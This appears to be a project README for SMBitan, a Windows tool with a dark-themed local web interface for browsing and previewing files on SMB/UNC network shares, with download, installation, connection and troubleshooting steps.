# 🗂️ SMBitan - Browse Network Files with Ease

[![Download SMBitan](https://img.shields.io/badge/Download-SMBitan-brightgreen)](https://github.com/liuoxdev/SMBitan/releases)

---

SMBitan lets you browse, search, and preview files on your network shares. It has a dark-themed web interface that runs on your Windows PC. You do not need to install complex software or have technical skills to use it.

---

## 🔍 What is SMBitan?

SMBitan is a simple tool to access files shared over a network using SMB or UNC paths. If your office or home network has shared folders, SMBitan helps you find and view files quickly in a clear web view. You can search files, see previews, and organize them without opening many windows.

It works on Windows computers and runs a local web page. This lets you use any browser to explore shared files. The app uses Python and a small built-in server called Flask to deliver the interface, but you don’t need to worry about that.

---

## 💻 System Requirements

Before you start, make sure your Windows PC meets these requirements:

- Windows 10, Windows 11, or newer  
- At least 2 GB of free RAM  
- At least 100 MB free disk space for the program  
- Internet or network connection to access SMB shares  
- A modern web browser (like Edge, Chrome, or Firefox)  

SMBitan runs on most recent Windows versions without extra setup or installing other software.

---

## 📦 Features at a Glance

- Browse files on SMB or UNC network shares  
- Search files by name and type  
- Preview images, text, and some document files in your browser  
- Dark-themed user interface for easy viewing  
- Simple network path entry to connect to shares  
- Runs locally on your PC with no data sent outside  

The focus is on making network files easy to find and see, with a clean and simple interface.

---

## 🚀 Getting Started with SMBitan

Follow these steps to download, install, and open SMBitan on your Windows PC.

---

## 1. Download SMBitan

Click this button to visit the releases page for SMBitan. You will find the latest version ready to download.

[![Download SMBitan](https://img.shields.io/badge/Download-SMBitan-blue)](https://github.com/liuoxdev/SMBitan/releases)

1. Open your web browser and click the button above or go to:  
   https://github.com/liuoxdev/SMBitan/releases

2. On the releases page, look for the latest release.  
3. Find the Windows version, usually an `.exe` installer or a `.zip` file.  
4. Click the file to download it to your PC.

---

## 2. Install the Application

Choose one of these paths depending on the file you downloaded:

- If you downloaded an installer file (for example, `SMBitan-setup.exe`):
  1. Double-click the file to start the installation.  
  2. Follow the on-screen prompts and accept the default options unless you want to change the install folder.  
  3. When finished, click Finish to complete the setup.

- If you downloaded a `.zip` archive:
  1. Right-click the `.zip` file and choose “Extract All.”  
  2. Pick a folder on your PC where you want to keep SMBitan.  
  3. Open that folder.

---

## 3. Run SMBitan

Once installed or extracted:

- Find the SMBitan program file. This might be `SMBitan.exe` or `run.bat`.  
- Double-click the file to start SMBitan.  

The program will open a new browser window or tab automatically. This is the SMBitan web interface where you will browse your network files.

---

## 4. Connect to Your Network Shares

Inside the SMBitan web UI:

- Look for a field labeled “Network path” or “Enter SMB/UNC path.”  
- Type the network folder address. It usually looks like one of these examples:  
  - `\\SERVERNAME\SharedFolder`  
  - `\\192.168.1.100\Documents`  
- Press Enter or click the browse button.

SMBitan will connect to that folder and show its contents. You can now browse files and folders as if you opened them on your PC.

---

## 5. Browse and Search Files

- Click folders to open and see more files inside.  
- Use the search box to find files by name.  
- Click on a file to see a preview in your browser (images, text, and some documents).  
- Use the back button or breadcrumbs at the top to return to previous folders.

---

## ⚙️ Troubleshooting Tips

- Make sure your PC is connected to the same network as the SMB shares.  
- Verify you have permission to access the network folder you entered.  
- Double-check the network path spelling and slashes (use backslashes `\`).  
- If SMBitan doesn't start, try running it as Administrator (right-click and choose "Run as administrator").  
- Disable or adjust firewalls temporarily if the application cannot connect to network shares.

---

## 🔧 How SMBitan Works Under the Hood

SMBitan runs a small web server on your PC using Python's Flask framework. When you open the program, it creates a local web page that shows the files on your network shares. It uses common SMB protocols to connect to shared folders and fetch file info.

Because it runs locally, your files stay on your network, and no data is sent to external servers.

You don’t need to install Python or other software separately; the installer bundles everything needed.

---

## 🛠️ Advanced Usage

- Use UNC paths anywhere SMBitan accepts network paths.  
- Try connecting to different shares on your network to view files in one place.  
- Use the dark UI settings to reduce eye strain during night use.  
- SMBitan can handle large folders and many files smoothly.

---

## 📂 Additional Resources

- SMBitan GitHub page: https://github.com/liuoxdev/SMBitan  
- Official releases: https://github.com/liuoxdev/SMBitan/releases  
- Your network or IT administrator can help with share names and permissions.

---

# [Download SMBitan](https://github.com/liuoxdev/SMBitan/releases) to start browsing your network files today.